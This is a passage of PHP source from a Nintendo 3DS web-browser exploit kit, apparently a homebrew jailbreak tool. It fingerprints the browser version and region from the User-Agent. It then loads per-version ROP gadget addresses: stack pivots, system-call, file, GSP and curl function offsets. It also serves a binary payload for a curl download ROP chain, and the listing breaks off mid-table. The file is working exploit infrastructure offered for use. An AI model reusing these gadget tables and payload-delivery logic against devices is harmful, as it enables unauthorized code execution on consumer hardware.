<?php

$getbinselect = -1;//Check the getbin param, for when handling a request from the curl httpdownload ROP below. This is done before the user-agent checks since the UA isn't set when downloading with the below curl ROP.
$getbinparam =  "";
if(isset($_REQUEST['getbin']))$getbinparam = $_REQUEST['getbin'];

browserhaxcfg_parsebinparam();

if($getbinselect==3)
{
	$path = browserhaxcfg_getbinpath_val3();

	$con = file_get_contents($path);
	if($con===FALSE)
	{
		echo "Failed to open binary on the server.";
	}
	else
	{
		echo $con;
	}

	exit;
}

$ua = $_SERVER['HTTP_USER_AGENT'];
if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; ") && !strstr($ua, "Mozilla/5.0 (New Nintendo 3DS"))
{
	echo "This exploit only supports the Nintendo 3DS main web-browser(s).\n";
	//error_log("3dsbrowserhax_common.php: INVALID USER-AGENT.");
	exit;
}

if(!isset($generatebinrop))$generatebinrop = 0;

if(isset($_REQUEST['browserver']))
{
	$browserver = intval($_REQUEST['browserver'], 16);
}

$browserver_regionbitmask = 0x0;

if(!isset($browserver))
{
	$browserver = -1;

	//v10.6/v10.7 are detected as the same browserver here because there's basically no difference between them for ROP-addrs and such.

	if(strstr($ua, ".CN"))
	{
		$browserver_regionbitmask = 0x40;
	}
	else if(strstr($ua, ".KR"))
	{
		$browserver_regionbitmask = 0x50;
	}
	else if(strstr($ua, ".TW"))
	{
		$browserver_regionbitmask = 0x60;
	}

	//old3ds: browserver titlever sysver
	if(strstr($ua, "1.7412"))//1.7412 v6/2.0.0-2
	{
		$browserver = 0x0;
	} else if(strstr($ua, "1.7455"))//1.7455 v1024/2.1.0-4
	{
		$browserver = 0x1;
	} else if(strstr($ua, "1.7498") || strstr($ua, "1.7538"))//USA/EUR/JPN 1.7498 v2050/4.0.0-7. 1.7538.KR v0/4.2.0-9(different from the v4.0 one).
	{
		$browserver = 0x2;
	} else if(strstr($ua, "1.7552"))//1.7552 v3075/5.0.0-11 / v3088/7.0.0-13 (v3088 main ncch is the same as v3075, only the manual CFA was updated)
	{
		$browserver = 0x3;
	} else if(strstr($ua, "1.7567"))//1.7567 v4096/7.1.0-16
	{
		$browserver = 0x4;
	} else if(strstr($ua, "1.7585"))//1.7585 v5121/9.5.0-23
	{
		$browserver = 0x5;
	} else if(strstr($ua, "1.7610"))//1.7610 v6149/9.9.0-26
	{
		$browserver = 0x6;
	}
	else if(strstr($ua, "1.7616"))//1.7616 v7168/10.2.0-28
	{
		$browserver = 0x7;
	}
	else if(strstr($ua, "1.7622") || strstr($ua, "1.7625"))//1.7622 v8192/10.6.0-31. 1.7625 v9232/10.7.0-32.
	{
		$browserver = 0x8;
	}
	else if(strstr($ua, "1.7630"))//1.7630 v10240/11.1.0-34.
	{
		$browserver = 0x9;
	}

	//new3ds: Mobile-NintendoBrowser-version titlever sysver
	if(strstr($ua, "1.0.9934"))//1.0.9934 v10 9.0.0-20
	{
		$browserver = 0x80;
	}
	else if(strstr($ua, "1.1.9996"))//1.1.9996 v1027 9.3.0-21
	{
		$browserver = 0x81;
	}
	else if(strstr($ua, "1.2.10085"))//1.2.10085 v2051 9.6.0-24
	{
		$browserver = 0x82;
	}
	else if(strstr($ua, "1.3.10126"))//1.3.10126 v3077 9.9.0-26
	{
		$browserver = 0x83;
	}
	else if(strstr($ua, "1.4.10138"))//1.4.10138 v4096 10.2.0-28
	{
		$browserver = 0x84;
	}
	else if(strstr($ua, "1.5.10143"))//1.5.10143 v5121 10.4.0-29
	{
		$browserver = 0x85;
	}
	else if(strstr($ua, "1.6.10147") || strstr($ua, "1.7.10150"))//1.6.10147 v6144 10.6.0-31. 1.7.10150 v7184 10.7.0-32.
	{
		$browserver = 0x86;
	}
	else if(strstr($ua, "1.8.10156"))//1.8.10156 v8192 11.1.0-34
	{
		$browserver = 0x87;
	}
}

if($browserver == -1)
{
	echo "This browser version is not recognized/supported by 3ds_browserhax_common. Whether this also applies to the exploit you're using is a seperate matter. See the 3ds_browserhax_common repo README if you just want to see if the browser exploit crashes.\n";
	//error_log("3dsbrowserhax_common.php: BROWSERVER NOT RECOGNIZED.");
	exit;
}

$browserver |= $browserver_regionbitmask;

$browserver_actualver = $browserver & 0xF;
if(!($browserver_actualver>=0x0 && $browserver_actualver<=0x9 && (($browserver & 0x80) == 0)) && !(($browserver & 0x80) && ($browserver_actualver>=0x0 && $browserver_actualver<=0x87)))
{
	echo "This browser version is not supported.\n";
	//error_log("3dsbrowserhax_common.php: BROWSERVER NOT SUPPORTED.");
	exit;
}

$DEVUNIT = 0;
$ropchainselect = -1;
$ropchainparam =  "";
if(isset($_REQUEST['rop']))$ropchainparam = $_REQUEST['rop'];
if(isset($_REQUEST['dev']))
{
	$devparam = $_REQUEST['dev'];
	if($devparam=="0")$DEVUNIT = 0;
	if($devparam=="1")$DEVUNIT = 1;
}

browserhaxcfg_handle_urlparams();

if($ropchainselect == -1)
{
	$ropchainselect = 0;
	$arm11code_loadfromsd = 2;
	if($browserver < 3)$ropchainselect = 1;

	browserhaxcfg_handledefault();
}

if($browserver == 0x0)
{
	//For <v5.0 NATIVE_FIRM: $APPHEAP_PHYSADDR = unknown;

	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v6.php");
}
else if($browserver == 0x1)
{
	//For <v5.0 NATIVE_FIRM: $APPHEAP_PHYSADDR = 0x24cff000;

	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v1024.php");
}
else if($browserver == 0x2)
{
	//For <v5.0 NATIVE_FIRM: $APPHEAP_PHYSADDR = 0x24d02000;

	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v2050.php");
}
else if($browserver == 0x3)
{
	if($DEVUNIT==0)
	{
		require_once("3dsbrowserhax_rop_spider_usaeurjpn_v3075_retail.php");

		//$ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> *(((u32*)r4+8)++; r0=1} "pop {r4, pc}"
	}
	else
	{
		$CODEBLK_ENDADR = 0x00440000;
		$OSSCRO_HEAPADR = 0x083a5000;
		$WEBKITCRO_HEAPADR = 0x08582000;
		$APPHEAP_PHYSADDR = 0x25000000;
		init_mapaddrs_cro();

		$STACKPIVOT_ADR = 0x00190060;
		$THROW_FATALERR = 0x0017a2a8;
		$COND_THROWFATALERR = 0x002822a0;

		$ROP_POP_R0R6PC = 0x00103d3c;
		$ROP_POP_R0R8PC = 0x00117778;
		$ROP_POP_R0IPPC = 0x0015864c;
		$ROP_POP_R0PC = 0x00139250;
		$ROP_POP_R1R5PC = 0x00101e78;

		$ROP_STR_R1TOR0 = 0x00103ba4;
		$ROP_LDR_R0FROMR0 = 0x0010e98c;
		//$ROP_STR_R1_TOR0_SHIFTR2 = 0x003327fc;
		$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101208;
		$ROP_ADDR0_TO_R1 = 0x001a3bfc;

		$ROP_LDMSTM_R5R4_R0R3 = 0x001d1e2c;

		$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x001251f4;

		$ROP_STMR0_R0PC = 0x001bb3e8;

		$SRVPORT_HANDLEADR = 0x003d968c;
		$SRV_REFCNT = 0x003d8f74;
		$srvpm_initialize = 0x0028bf0c;
		$srv_shutdown = 0x0028c7dc;
		$srv_GetServiceHandle = 0x0023be80;

		$svcGetProcessId = 0x00100c9c;
		$svcSendSyncRequest = 0x002441c0;
		$svcControlMemory = 0x00146508;
		$svcSleepThread = 0x0010e9b8;

		$GXLOW_CMD4 = 0x00195b38;
		$GSP_FLUSHDCACHE = 0x00195a34;
		$GSP_WRITEHWREGS = 0x001b2c9c;

		$IFile_Open = 0x002159e8;
		$IFile_Close = 0x0020a9b0;
		$IFile_GetSize = 0x001edcb8;
		$IFile_Seek = 0x0014f8a8;
		$IFile_Read = 0x0014f820;
		$IFile_Write = 0x00179cfc;

		$FS_DELETEFILE = 0x00179b18;

		$FSFILEIPC_CLOSE = 0x0027ea58;
		$FSFILEIPC_READ = 0x0027ea00;
		$FSFILEIPC_GETSIZE = 0x0027eae4;

		$OPENFILEDIRECTLY_WRAP = 0x0027b3f8;
	}
}
else if($browserver == 0x4)
{
	$CODEBLK_ENDADR = 0x00440000;
	$OSSCRO_HEAPADR = 0x083a5000;
	$WEBKITCRO_HEAPADR = 0x08582000;
	$APPHEAP_PHYSADDR = 0x25000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x00130388;
	$THROW_FATALERR = 0x00151b44;
	$COND_THROWFATALERR = 0x002824a8;

	$ROP_POP_R0R6PC = 0x0010512c;
	$ROP_POP_R0R8PC = 0x00130fb0;
	$ROP_POP_R0IPPC = 0x0018c9b0;
	$ROP_POP_R0PC = 0x0010c2fc;
	$ROP_POP_R1R5PC = 0x00101e8c;

	$ROP_STR_R1TOR0 = 0x001040c0;
	$ROP_LDR_R0FROMR0 = 0x00111668;
	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;
	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;
	$ROP_ADDR0_TO_R1 = 0x0012bb50;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001d3f04;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00168848;//Same code as browserver val3.

	$ROP_STMR0_R0PC = 0x001bb4cc;

	$SRVPORT_HANDLEADR = 0x003d968c;
	$SRV_REFCNT = 0x003d8f64;
	$srvpm_initialize = 0x0028c114;
	$srv_shutdown = 0x0028c9e4;
	$srv_GetServiceHandle = 0x0023c45c;

	$svcGetProcessId = 0x00100ca4;
	$svcSendSyncRequest = 0x002443e4;
	$svcControlMemory = 0x001431a0;
	$svcSleepThread = 0x001041f8;

	$GXLOW_CMD4 = 0x0011dd48;
	$GSP_FLUSHDCACHE = 0x00191500;
	$GSP_WRITEHWREGS = 0x0011e150;
	$GSPGPU_SERVHANDLEADR = 0x003da72c;

	$IFile_Open = 0x0022fe08;
	$IFile_Close = 0x001fdba4;
	$IFile_GetSize = 0x00207514;
	$IFile_Seek = 0x00151694;
	$IFile_Read = 0x001686dc;
	$IFile_Write = 0x00168764;

	$FS_DELETEFILE = 0x001683c0;

	$FSFILEIPC_CLOSE = 0x0027ec60;
	$FSFILEIPC_READ = 0x0027ec08;
	$FSFILEIPC_GETSIZE = 0x0027ecec;

	//$READ_EXEFSFILE = 0x0027b398;
	$OPENFILEDIRECTLY_WRAP = 0x0027b600;

	$APT_PrepareToDoApplicationJump = 0x00299fb8;
	$APT_DoApplicationJump = 0x0029953c;

	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
}
else if($browserver == 0x5)
{
	$CODEBLK_ENDADR = 0x00440000;
	$OSSCRO_HEAPADR = 0x083a5000;
	$WEBKITCRO_HEAPADR = 0x08589000;
	$APPHEAP_PHYSADDR = 0x25000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x001303d4;
	$THROW_FATALERR = 0x00151c10;
	$COND_THROWFATALERR = 0x002824ec;

	$ROP_POP_R0R6PC = 0x00105180;
	$ROP_POP_R0R8PC = 0x00131040;
	$ROP_POP_R0IPPC = 0x0018ca04;
	$ROP_POP_R0PC = 0x0010c3c0;
	$ROP_POP_R1R5PC = 0x00101e8c;

	$ROP_STR_R1TOR0 = 0x00104114;
	$ROP_LDR_R0FROMR0 = 0x0011172c;
	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x003329e4;
	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;
	$ROP_ADDR0_TO_R1 = 0x0012bc14;

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2ff20;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001d3f54;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00168914;//Same code as browserver val3.

	$ROP_STMR0_R0PC = 0x001bb51c;

	$SRVPORT_HANDLEADR = 0x003d968c;
	$SRV_REFCNT = 0x003d8f64;
	$srvpm_initialize = 0x0028c0e8;
	$srv_shutdown = 0x0028c9b8;
	$srv_GetServiceHandle = 0x0023c4b4;

	$svcGetProcessId = 0x00100ca4;
	$svcSendSyncRequest = 0x0024444c;
	$svcControlMemory = 0x001431f4;
	$svcSleepThread = 0x0010424c;

	$GXLOW_CMD4 = 0x0011de0c;
	$GSP_FLUSHDCACHE = 0x00191390;
	$GSP_WRITEHWREGS = 0x0011e214;
	$GSPGPU_SERVHANDLEADR = 0x003da72c;

	$IFile_Open = 0x0022fe5c;
	$IFile_Close = 0x001fdbf8;
	$IFile_GetSize = 0x00207568;
	$IFile_Seek = 0x001516e8;
	$IFile_Read = 0x001687a8;
	$IFile_Write = 0x00168830;

	$FS_DELETEFILE = 0x0016848c;

	$FSFILEIPC_CLOSE = 0x0027eca4;
	$FSFILEIPC_READ = 0x0027ec4c;
	$FSFILEIPC_GETSIZE = 0x0027ed30;

	//$READ_EXEFSFILE = 0x0027b3dc;
	$OPENFILEDIRECTLY_WRAP = 0x0027b644;

	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
	//$APT_DoApplicationJump = 0x0029953c;//needs updated

	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
}
else if($browserver == 0x6)
{
	$CODEBLK_ENDADR = ((0x00100000 + 0x00270000 + 0x00064000 + 0x00018000 + 0x00056830) + 0xfff) & ~0xfff;
	$OSSCRO_HEAPADR = 0x083a5000;
	$WEBKITCRO_HEAPADR = 0x0858a000;
	$APPHEAP_PHYSADDR = 0x25000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x00131080;
	$COND_THROWFATALERR = 0x001a0420;

	$ROP_POP_R0R6PC = 0x00105128;
	$ROP_POP_R0R8PC = 0x00131cec;
	$ROP_POP_R0PC = 0x0010c460;
	$ROP_POP_R1R5PC = 0x00101e8c;

	$ROP_STR_R1TOR0 = 0x001040bc;
	$ROP_LDR_R0FROMR0 = 0x001117cc;
	$ROP_ADDR0_TO_R1 = 0x0012c2f8;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00169c1c;

	$srv_GetServiceHandle = 0x0023c9ec;

	$svcGetProcessId = 0x00100ca4;
	$svcSendSyncRequest = 0x0024488c;
	$svcControlMemory = 0x001447f4;
	$svcSleepThread = 0x001041f4;

	$GXLOW_CMD4 = 0x0011de60;
	$GSPGPU_SERVHANDLEADR = 0x003dd72c;

	$FS_MOUNTSDMC = 0x0019dcdc;

	$IFile_Open = 0x00230124;
	$IFile_GetSize = 0x002076b0;
	$IFile_Seek = 0x00152844;
	$IFile_Read = 0x00169ab0;

	$FS_DELETEFILE = 0x00169794;

	$FSFILEIPC_CLOSE = 0x0028095c;
	$FSFILEIPC_READ = 0x00280904;
	$FSFILEIPC_GETSIZE = 0x002809e8;

	$POPPC = 0x001057c0;

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x0002ff20;

	$WKC_FOPEN = $OSSCRO_MAPADR+0x5d8-0x4;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0x5d0-0x4;
	$WKC_FREAD = $OSSCRO_MAPADR+0x5e0-0x4;
	$WKC_FWRITE = $OSSCRO_MAPADR+0x5e8-0x4;
	$WKC_FSEEK = $OSSCRO_MAPADR+0x5f8-0x4;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xe9c-0x4;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea4-0x4;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xecc-0x4;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa2c-0x4;

	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x194-0x4;
	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x30c-0x4;

	$GSP_FLUSHDCACHE = 0x00192798;
	$GSP_WRITEHWREGS = 0x0011e268;

	$IFile_Close = 0x001fdccc;
	$IFile_Write = 0x00169b38;

	$OPENFILEDIRECTLY_WRAP = 0x0027d2fc;

	$THROW_FATALERR = 0x00152dec;

	$ROP_POP_R0IPPC = 0x0018de08;

	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001d39fc;

	$ROP_STMR0_R0PC = 0x001bc8c0;

	$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;
}
else if($browserver == 0x7)
{
	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v7168.php");
}
else if($browserver == 0x8)
{
	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v8192.php");
}
else if($browserver == 0x9)
{
	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v10240.php");
}
else if($browserver == 0x42)//1.7538.CN v0/4.2.0-9
{
	require_once("3dsbrowserhax_rop_spider_chn_v0.php");
}
else if($browserver == 0x46)//1.7610.CN v6149/9.9.0-26
{
	require_once("3dsbrowserhax_rop_spider_chn_v6149.php");
}
else if($browserver == 0x47)//1.7616.CN v7168/10.2.0-28
{
	require_once("3dsbrowserhax_rop_spider_chn_v7168.php");
}
else if($browserver == 0x48)//1.7622.CN v8192/10.6.0-31. 1.7625.CN v9232/10.7.0-32.
{
	require_once("3dsbrowserhax_rop_spider_chn_v8192.php");
}
else if($browserver == 0x52)//1.7538.KR v0/4.2.0-9
{
	require_once("3dsbrowserhax_rop_spider_kor_v0.php");
}
else if($browserver == 0x56)//1.7610.KR v6149/9.9.0-26
{
	require_once("3dsbrowserhax_rop_spider_kor_v6149.php");
}
else if($browserver == 0x57)//1.7616.KR v7168/10.2.0-28
{
	require_once("3dsbrowserhax_rop_spider_kor_v7168.php");
}
else if($browserver == 0x58)//1.7622.KR v8192/10.6.0-31. 1.7625.KR v9232/10.7.0-32.
{
	require_once("3dsbrowserhax_rop_spider_kor_v8192.php");
}
else if($browserver == 0x66)//1.7610.TW v6149/9.9.0-26
{
	require_once("3dsbrowserhax_rop_spider_twn_v6149.php");
}
else if($browserver == 0x67)//1.7616.TW v7168/10.2.0-28
{
	require_once("3dsbrowserhax_rop_spider_twn_v7168.php");
}
else if($browserver == 0x68)//1.7622.TW v8192/10.6.0-31. 1.7625.TW v9232/10.7.0-32.
{
	require_once("3dsbrowserhax_rop_spider_twn_v8192.php");
}
else if($browserver == 0x80)//new3ds
{
	$CODEBLK_ENDADR = 0x00422000;
	$OSSCRO_HEAPADR = 0x0810e000;
	$WEBKITCRO_HEAPADR = 0x083cc000;
	$PEERCRO_HEAPADR = 0x082e7000;
	$APPHEAP_PHYSADDR = 0x2b000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x00279a10;
	$THROW_FATALERR = 0x001f10f8;
	$COND_THROWFATALERR = 0x00261148;

	$ROP_POP_R0R6PC = 0x001de9f0;
	$ROP_POP_R0R8PC = 0x00309fdc;
	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2d04;
	$ROP_POP_R0PC = 0x002954e8;
	$ROP_POP_R1R5PC = 0x001dbfd0;

	$ROP_STR_R1TOR0 = 0x002258a4;
	$ROP_LDR_R0FROMR0 = 0x001f6a60;
	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated (doesn't exist with SKATER)
	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0xf8cfc;
	$ROP_ADDR0_TO_R1 = 0x0027a2c0;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001e7d10;//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r6, {r0, r1, r2, r3}" branch to: "vpop {d8}" "pop {r4, r5, r6, pc}"

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00295b8c;//Same code as browserver val3.

	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x1ee9d;//Thumb: "stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" nop "movs r0, #20". branch to: "pop {r4, r5, r6, pc}"

	$SRVPORT_HANDLEADR = 0x003d9f80;
	$SRV_REFCNT = 0x003d9da8;
	$srvpm_initialize = 0x001ea3cc;
	$srv_shutdown = 0x0028c9e4;//needs updated
	$srv_GetServiceHandle = 0x001e9ce4;

	$svcGetProcessId = 0x0026a608;
	$svcSendSyncRequest = 0x001ea320;
	$svcControlMemory = 0x00261eb8;
	$svcSleepThread = 0x002d6a5c;

	$GXLOW_CMD4 = 0x002a08d0;
	$GSP_FLUSHDCACHE = 0x0029c02c;
	$GSP_WRITEHWREGS = 0x002968bc;
	$GSPGPU_SERVHANDLEADR = 0x003da3d0;

	$IFile_Open = 0x0031fe74;
	$IFile_Close = 0x001eb8cc;
	$IFile_GetSize = 0x001f1128;
	$IFile_Seek = 0x0032b508;
	$IFile_Read = 0x0030a094;
	$IFile_Write = 0x00324dd0;

	$FS_DELETEFILE = 0x0032368c;

	$FSFILEIPC_CLOSE = 0x00266764;
	$FSFILEIPC_READ = 0x0026670c;
	$FSFILEIPC_GETSIZE = 0x003324c4;

	//$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated (doesn't exist with SKATER)

	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
	//$APT_DoApplicationJump = 0x0029953c;//needs updated

	$ROP_snprintf = $OSSCRO_MAPADR+0xd4750-0x4;
}
else if($browserver == 0x81)
{
	$CODEBLK_ENDADR = 0x00426000;
	$OSSCRO_HEAPADR = 0x0810e000;
	$PEERCRO_HEAPADR = 0x082ed000;
	$WEBKITCRO_HEAPADR = 0x083d2000;
	$APPHEAP_PHYSADDR = 0x2b000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x00279c54;
	$THROW_FATALERR = 0x001f1894;
	$COND_THROWFATALERR = 0x0026134c;

	$ROP_POP_R0R6PC = 0x001df0f4;
	$ROP_POP_R0R8PC = 0x0030a848;
	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2d0c;
	$ROP_POP_R0PC = 0x002958fc;
	$ROP_POP_R1R5PC = 0x001dc6d4;

	$ROP_STR_R1TOR0 = 0x002261f4;
	$ROP_LDR_R0FROMR0 = 0x001f71fc;
	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated (doesn't exist with SKATER)
	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0xfd724;
	$ROP_ADDR0_TO_R1 = 0x0027a504;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001e8414;//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r6, {r0, r1, r2, r3}" branch to: "vpop {d8}" "pop {r4, r5, r6, pc}"

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00295fa0;//Same code as browserver val3.

	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x1ee9d;//Thumb: "stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" nop "movs r0, #20". branch to: "pop {r4, r5, r6, pc}"

	$SRVPORT_HANDLEADR = 0x003ddf80;
	$SRV_REFCNT = 0x003ddda8;
	$srvpm_initialize = 0x001ea3cc;
	$srv_shutdown = 0x0028cde8;
	$srv_GetServiceHandle = 0x001ea3e8;

	$svcGetProcessId = 0x0026a80c;
	$svcSendSyncRequest = 0x001eaa24;
	$svcControlMemory = 0x002620bc;
	$svcSleepThread = 0x002d7448;

	$GXLOW_CMD4 = 0x002a0e94;
	$GSP_FLUSHDCACHE = 0x0029c5e0;
	$GSP_WRITEHWREGS = 0x00296cd0;
	$GSPGPU_SERVHANDLEADR = 0x003de3d0;

	$IFile_Open = 0x003205bc;
	$IFile_Close = 0x001ec068;
	$IFile_GetSize = 0x001f18c4;
	$IFile_Seek = 0x0032bb1c;
	$IFile_Read = 0x0030a96c;
	$IFile_Write = 0x0032544c;

	$FS_DELETEFILE = 0x00323dd4;

	$FSFILEIPC_CLOSE = 0x00266968;
	$FSFILEIPC_READ = 0x00266910;
	$FSFILEIPC_GETSIZE = 0x00332b00;

	//$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated (doesn't exist with SKATER)

	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
	//$APT_DoApplicationJump = 0x0029953c;//needs updated

	$ROP_snprintf = $OSSCRO_MAPADR+0xd9168-0x4;
}
else if($browserver == 0x82)
{
	$CODEBLK_ENDADR = ((0x00100000 + 0x00276000 + 0x00065000 + 0x0000A000 + 0x00045928) + 0xfff) & ~0xfff;
	$OSSCRO_HEAPADR = 0x0810e000;
	$WEBKITCRO_HEAPADR = 0x083d6000;
	$PEERCRO_HEAPADR = 0x082f1000;
	$APPHEAP_PHYSADDR = 0x2b000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x0027a5a8;
	$COND_THROWFATALERR = 0x00261bdc;

	$ROP_POP_R0R6PC = 0x001df39c;
	$ROP_POP_R0R8PC = 0x0030b454;
	$ROP_POP_R0PC = 0x002962d4;
	$ROP_POP_R1R5PC = 0x001dc97c;

	$ROP_STR_R1TOR0 = 0x00226494;
	$ROP_LDR_R0FROMR0 = 0x001f74c0;
	$ROP_ADDR0_TO_R1 = 0x0027ae58;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00296978;

	$srv_GetServiceHandle = 0x001ea6a8;

	$svcGetProcessId = 0x0026b09c;
	$svcSendSyncRequest = 0x001eace4;
	$svcControlMemory = 0x0026294c;
	$svcSleepThread = 0x002d80a0;

	$GXLOW_CMD4 = 0x002a1908;
	$GSPGPU_SERVHANDLEADR = 0x003e33d0;

	$FS_MOUNTSDMC = 0x00317e5c;

	$IFile_Open = 0x003213e4;
	$IFile_GetSize = 0x001f1b88;
	$IFile_Seek = 0x0032ca78;
	$IFile_Read = 0x0030b578;

	$FS_DELETEFILE = 0x00324bfc;

	$FSFILEIPC_CLOSE = 0x002671f8;
	$FSFILEIPC_READ = 0x002671a0;
	$FSFILEIPC_GETSIZE = 0x00333a5c;

	$POPPC = 0x001df1b8;

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x004222a0;

	$WKC_FOPEN = $OSSCRO_MAPADR+0xdb4c4-0x4;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0xdb4b4-0x4;
	$WKC_FREAD = $OSSCRO_MAPADR+0xdb4bc-0x4;
	$WKC_FWRITE = $OSSCRO_MAPADR+0xdb4cc-0x4;
	$WKC_FSEEK = $PEERCRO_MAPADR+0x1f77d;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4db9a8-0x4;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db510-0x4;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4dba70-0x4;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db518-0x4;

	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4dadb8-0x4;
	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4dad98-0x4;

	$GSP_FLUSHDCACHE = 0x0029cf4c;
	$GSP_WRITEHWREGS = 0x00297774;

	$IFile_Close = 0x001ec32c;
	$IFile_Write = 0x00326340;

	$THROW_FATALERR = 0x001f1b58;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001e86d4;

	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2e94;

	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x000ff87c;

	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ee91;

	$ROP_snprintf = $OSSCRO_MAPADR+0xdb2bc-0x4;
}
else if($browserver == 0x83)
{
	$CODEBLK_ENDADR = ((0x00100000 + 0x00277000 + 0x00065000 + 0x0000A000 + 0x00045928) + 0xfff) & ~0xfff;
	$OSSCRO_HEAPADR = 0x08133000;
	$WEBKITCRO_HEAPADR = 0x083ff000;
	$PEERCRO_HEAPADR = 0x0831a000;
	$APPHEAP_PHYSADDR = 0x2b000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x0027b058;
	$COND_THROWFATALERR = 0x0026268c;

	$ROP_POP_R0R6PC = 0x001df788;
	$ROP_POP_R0R8PC = 0x0030c248;
	$ROP_POP_R0PC = 0x00296d84;
	$ROP_POP_R1R5PC = 0x001dcd68;

	$ROP_STR_R1TOR0 = 0x00226b9c;
	$ROP_LDR_R0FROMR0 = 0x001f799c;
	$ROP_ADDR0_TO_R1 = 0x0027b908;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00297428;

	$srv_GetServiceHandle = 0x001eaa94;

	$svcGetProcessId = 0x0026bb4c;
	$svcSendSyncRequest = 0x001eb0d0;
	$svcControlMemory = 0x002633fc;
	$svcSleepThread = 0x002d8bf4;

	$GXLOW_CMD4 = 0x002a23b8;
	$GSPGPU_SERVHANDLEADR = 0x003e43d0;

	$FS_MOUNTSDMC = 0x00318c50;

	$IFile_Open = 0x00322204;
	$IFile_GetSize = 0x001f1f74;
	$IFile_Seek = 0x0032d86c;
	$IFile_Read = 0x0030c36c;

	$FS_DELETEFILE = 0x00325a34;

	$FSFILEIPC_CLOSE = 0x00267ca8;
	$FSFILEIPC_READ = 0x00267c50;
	$FSFILEIPC_GETSIZE = 0x00334858;

	$POPPC = 0x001df5a4;

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x004223dc;

	$WKC_FOPEN = $OSSCRO_MAPADR+0xde3a8-0x4;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0xde398-0x4;
	$WKC_FREAD = $OSSCRO_MAPADR+0xde3a0-0x4;
	$WKC_FWRITE = $OSSCRO_MAPADR+0xde3b0-0x4;
	$WKC_FSEEK = $PEERCRO_MAPADR+0x1f83d;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4dbaf0-0x4;
